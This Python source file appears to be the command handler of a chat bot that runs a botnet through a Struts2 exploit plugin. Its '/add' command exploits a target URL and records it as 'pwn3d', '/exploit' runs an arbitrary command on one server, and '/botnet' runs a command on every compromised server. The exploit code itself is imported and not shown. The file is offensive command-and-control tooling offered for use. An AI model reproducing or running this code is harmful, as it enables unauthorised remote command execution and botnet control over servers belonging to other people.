# -*- coding: utf-8 -*-

from plugins.struts2 import struts2

class actions:
    def __init__(self,bot,msg,chat_id):
        self.xpl = struts2()
        self.bot = bot
        self.msg = msg
        self.chat_id = chat_id
        if msg.startswith('/add'):
            self.add()
        elif msg.startswith('/total'):
            self.total()
        elif msg.startswith('/exploit'):
            self.exploit()
        elif msg.startswith('/botnet'):
            self.botnet()

    def add(self,):
            splited = self.msg.split(' ',1)
            if len(splited) < 2:
                self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!!')
            else:
                url = splited[1]
                print url
                response = self.xpl.add(url)
                if response:
                    self.bot.sendMessage(self.chat_id,'Server pwn3d and saved.')
                else:
                    self.bot.sendMessage(self.chat_id,'Sorry, i can not exploit it')

    def total(self,):
        totalServer = self.xpl.total()
        self.bot.sendMessage(self.chat_id,'Bro, we have %d server in our botnet' % totalServer)

    def exploit(self,):
        splited = self.msg.split(' ',1)
        if len(splited) == 2 and len(splited[1].rsplit('*',1)) == 2:
            url,cmd = splited[1].rsplit('*',1)
            print cmd
            print url
            response = self.xpl.exploit(url,cmd)
            if response:
                self.bot.sendMessage(self.chat_id,response)
            else:
                self.bot.sendMessage(self.chat_id,'Bro there is something going wrong, sorry :/')
        else:
            self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!')
    def botnet(self,):
        splited = self.msg.split(' ',1)
        if len(splited) < 2:
            self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!')
        else:
            cmd = splited[1]
            totalExec = self.xpl.botnet(cmd)
            totalServer = self.xpl.total()
            self.bot.sendMessage(self.chat_id,'Bro, pay attention, the command you sent was executed in %d/%d servers.' %(totalExec,totalServer))
